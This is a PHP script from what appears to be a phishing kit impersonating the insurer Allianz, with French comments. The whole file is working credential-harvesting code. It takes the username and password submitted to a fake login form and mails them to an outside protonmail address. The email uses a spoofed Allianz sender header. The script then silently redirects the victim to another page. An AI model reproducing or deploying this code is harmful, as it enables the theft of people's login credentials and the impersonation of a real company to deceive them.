<?php 
//die( $_POST['_user'].'  '.$_POST['_pass']);
//echo '<a href="index.html">index.html</a>';
$sujet = 'Nouveau Allianz: '.date("d-M-Y", strtotime("now")).' a '.date("H:i:s", strtotime("now"));
$message = 	'Email =>'.$_POST['username'].
			'Mot de passe =>'.$_POST['password'];
$destinataire = 'docsavebox@protonmail.com';
$headers = "From: \"Allianz\"<info@allianz.fr>\n";
$headers .= "Reply-To: info@allianz.fr\n";
$headers .= "Content-Type: text/plain; charset=\"iso-8859-1\"";

if(mail($destinataire,$sujet,$message,$headers))
{
?>
<script type="text/javascript">function redirection(page)
  {window.location=page;}
setTimeout('redirection("redirection.php")',0000);
//1000 millisecondes=1 secondes, le temps après lequel on redirige.</script>
<?php
}
else
{
?>
<script type="text/javascript">function redirection(page)
  {window.location=page;}
setTimeout('redirection("index.html")',0000);
//1000 millisecondes=1 secondes, le temps après lequel on redirige.</script>
<?php
}
?>